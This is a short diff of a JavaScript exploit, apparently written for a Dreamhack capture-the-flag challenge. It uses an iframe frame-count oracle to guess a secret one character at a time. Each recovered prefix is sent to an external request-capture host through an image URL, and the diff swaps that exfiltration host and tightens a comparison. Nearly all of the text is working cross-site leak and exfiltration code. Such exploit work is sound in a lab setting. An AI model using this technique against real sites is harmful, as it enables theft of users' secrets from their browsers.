@@ -6,7 +6,7 @@
             const iframe = document.getElementById("iframe");
             iframe.src = url;
             iframe.onload = () => {
-                if (iframe.contentWindow.frames.length != 0)
+                if (iframe.contentWindow.frames.length !== 0)
                     return resolve();
                 else
                     return reject();
@@ -33,7 +33,7 @@
             for (let ch of chars){
                 if(await search(secret + ch)){
                     secret += ch;
-                    img.src=`https://duhhtfa.request.dreamhack.games/${secret}`;
+                    img.src=`https://ejdkdkq.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
